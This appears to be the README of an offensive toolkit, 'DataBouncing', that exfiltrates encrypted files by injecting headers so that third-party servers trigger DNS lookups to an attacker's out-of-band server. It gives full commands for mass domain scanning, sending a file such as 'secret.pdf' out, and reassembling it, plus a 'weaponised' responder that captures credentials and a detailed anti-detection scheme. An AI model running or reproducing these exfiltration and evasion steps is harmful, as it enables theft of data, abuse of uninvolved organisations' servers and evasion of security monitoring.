# DB26 DataBouncing Toolkit

Indirect data exfiltration via HTTP header injection through third-party infrastructure.

## Architecture

```
  RECRUITER                 SENDER                  RECEIVER
  Scans domains,            Encrypts file,          Reads DNS log,
  finds proven              chunks into DNS         deshuffles,
  domain + header           labels, bounces         reassembles,
  pairs                     through candidates      decrypts, verifies

  recruiter                 db26-send               db26-recv
      |                         |                       |
      | proven_candidates.jsonl |                       |
      +------------------------>+                       |
                                |                       |
                                |   TCP/HTTPS to        |
                                |   third-party         |
                                |   domains             |
                                |                       |
                                v                       |
                        Third-party servers             |
                        process headers,                |
                        trigger DNS lookups             |
                                |                       |
                                |   UDP/DNS with        |
                                |   embedded data       |
                                v                       |
                          OOB Server                    |
                          (interactsh)                  |
                          captures all                  |
                          DNS queries                   |
                                |                       |
                                |   interactsh.log      |
                                +---------------------->+
                                                        |
                                                        v
                                                  Reassembled file
```

## Quick Start

### 1. Prerequisites

```bash
# VPS with interactsh
ssh root@<YOUR_VPS_IP>

# Config is at ~/.db26/config.json (auto-loaded)
cat ~/.db26/config.json
```

### 2. Recruit Candidates

Find domains + headers that process and relay DNS queries:

```bash
recruiter \
  -d domains.txt \
  --run-dir /root/db26/runs/$(date +%Y%m%d_%H%M%S)_recruit \
  -w 2000 --rps 5000 --timeout 1 --https=true --grace 120 -v
```

Config file provides server URL and token automatically.

Output: `databouncing_candidates.jsonl` - each line:
```json
{"domain":"example.com","callbacks":5,"headers":{"host":3,"xff":2}}
```

### 3. Convert Candidates for Sender

```bash
# Extract domain + proven headers into sender format
python3 -c "
import json
with open('databouncing_candidates.jsonl') as f:
    for line in f:
        d = json.loads(line)
        domain = d.get('domain','')
        hdrs = list(d.get('headers',{}).keys())
        if domain and hdrs:
            print(json.dumps({'domain': domain, 'headers': hdrs}))
" > proven_candidates.jsonl
```

### 4. Send a File

```bash
db26-send \
  -file secret.pdf \
  -passphrase "your-strong-passphrase" \
  -candidates proven_candidates.jsonl \
  -oob-domains oob.yourdomain.com \
  -corr-ids <fresh-correlation-id> \
  -retries 10 \
  -decoy-rate 0.2 \
  -jitter-min 50 -jitter-max 500 \
  -log send_log.jsonl
```

The sender outputs: salt, fileID, checksum. The receiver needs these.

### 5. Receive and Reassemble

```bash
db26-recv \
  -passphrase "your-strong-passphrase" \
  -salt <hex-from-sender> \
  -corr-ids <correlation-id> \
  -oob-domains oob.yourdomain.com \
  -file-id <hex-from-sender> \
  -output ./received/ \
  -enrich
```

Output: reassembled file + integrity verification.

## Binaries

| Binary | Size | Purpose |
|--------|------|---------|
| `recruiter` | 37M | Identify proven domain+header bounce points |
| `db26-send` | 8M | Encrypt, chunk, shuffle, bounce data through candidates |
| `db26-recv` | 8.4M | Collect, deshuffle, reassemble, decrypt, verify |
| `responder` | 9.2M | Weaponised HTTP/HTTPS response server (SSRF/auth) |
| `report` | 2.8M | Generate JSONL reports from run data |

## Recruiter Details

### Pre-flight Checks

The recruiter validates everything before starting:
- Domains file readable + line count
- Run directory writable
- DNS resolution working
- Interactsh server reachable
- Server log accessible
- Disk space available
- All dependencies installed (interactsh-server, subfinder, screen, etc.)

### Config File

`~/.db26/config.json` - loaded automatically:

```json
{
  "interactsh_server": "https://oob.yourdomain.com",
  "interactsh_token": "your-token",
  "vps_address": "<YOUR_VPS_IP>",
  "interactsh_log": "/var/log/interactsh/interactsh.log",
  "runs_dir": "/root/db26/runs",
  "bin_paths": ["/root/go/bin", "/usr/local/go/bin"],
  "workers": 2000,
  "rps": 5000,
  "timeout": 1,
  "grace": 120,
  "probe_https": true
}
```

### Output Structure

Each run generates:
```
/root/db26/runs/<timestamp>/
├── recruiter.log                   # Full run log
├── summary.json                    # Run metadata
├── databouncing_candidates.jsonl   # Proven domain+header pairs
├── tainted_fetches.jsonl           # SSRF/RFI HTTP requests
└── credential_captures.jsonl       # Auth credential captures
```

## Sender Details

### Wire Format

Each chunk is encoded as DNS labels in **random order**:

```
[fileID].[seq].[total].[base32data].[corrID].[oob.domain]
```

Fields identified by **unique length** (session-derived):
- `fileID`: 3-5 chars (varies per session)
- `seq`: 6-8 chars
- `total`: 9-11 chars
- `data`: 16-40 chars (base32 encoded)
- `decoy`: random length, random chars (injected 10-30%)

Field lengths derived from encryption key via Argon2id - different key = different lengths. No cross-session pattern.

### Anti-Detection

- Random field order per query (24 permutations)
- Decoy labels injected at configurable rate
- Session-variable field lengths
- Random candidate selection
- Random OOB domain per chunk (multi-domain)
- Random header per candidate (from proven set)
- Random inter-send jitter
- Encrypted payload indistinguishable from random base32
- Chunk send order randomised (not sequential)

### Encryption

- AES-256-GCM (authenticated encryption)
- Key derived from passphrase via Argon2id (64MB, 3 iterations)
- 12-byte random nonce per encryption
- SHA-256 checksum for integrity verification

### Capacity

- 25 bytes raw data per chunk
- With 10M candidates used once: ~246 MB
- With 10x redundancy: ~25 MB reliable
- Throughput: depends on jitter settings

## Receiver Details

### Reassembly

1. Derive session key from passphrase + salt (same as sender)
2. Read interactsh server log
3. Filter by correlation ID(s)
4. For each DNS callback: strip corrID, identify fields by length, discard decoys
5. Base32 decode data, group by fileID
6. When all chunks collected: concatenate in sequence order
7. Strip checksum prefix, decrypt AES-256-GCM
8. Verify SHA-256 checksum
9. Write file

### IP Intelligence

With `-enrich` flag, the receiver looks up each resolver IP:
- Reverse DNS
- ASN / Organisation
- Country / City
- Classification (CDN, cloud, corporate, ISP)

## Responder Details

Weaponised HTTP/HTTPS response server for SSRF/RFI detection:

- Only responds to tainted requests (correlation ID in Host header)
- Serves crafted payloads per path:
  - `/.env` → Fake credentials with canary tokens
  - `/.git/config` → Fake git config
  - `/*.json` → Config with tracking
  - `/*.php` → Fake phpinfo with callback
  - `/favicon.ico` → HTML with phone-home beacon
  - `/login`, `/owa` → NTLM + Basic auth challenge
- All payloads embed unique canary tokens
- `/tech/*` callback endpoint detects which technology parsed the payload
- Noise (random scanners) logged separately

## Subfinder Integration

Enumerate subdomains to expand the target corpus:

```bash
# Install
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Run against top domains
screen -dmS subfinder subfinder -dL top-500k.txt -t 100 -timeout 15 -silent -o subdomains.txt

# Snapshot and run recruiter against new subdomains
cp subdomains.txt batch_N.txt
sort -u batch_N.txt > batch_N_dedup.txt
comm -13 previous_batch.txt batch_N_dedup.txt > delta.txt

recruiter -d delta.txt --run-dir /root/db26/runs/$(date +%Y%m%d)_delta ...
```

## Multi-Domain Setup

Spread traffic across multiple OOB domains:

1. Register additional domains
2. Point NS records to VPS IP (same as oob.yourdomain.com)
3. Configure interactsh: `-domain oob.yourdomain.com,exf.other.io,dns.third.net`
4. Sender: `-oob-domains oob.yourdomain.com,exf.other.io -corr-ids corrA,corrB`
5. Receiver: same flags - all callbacks land in one interactsh log

## VPS

- IP: <YOUR_VPS_IP>
- Domain: oob.yourdomain.com (Cloudflare NS delegation)
- OS: Ubuntu 24.04, 8GB RAM, 2 vCPU
- Interactsh: systemd service, auto-restart
- Screen: all long-running tasks in named sessions
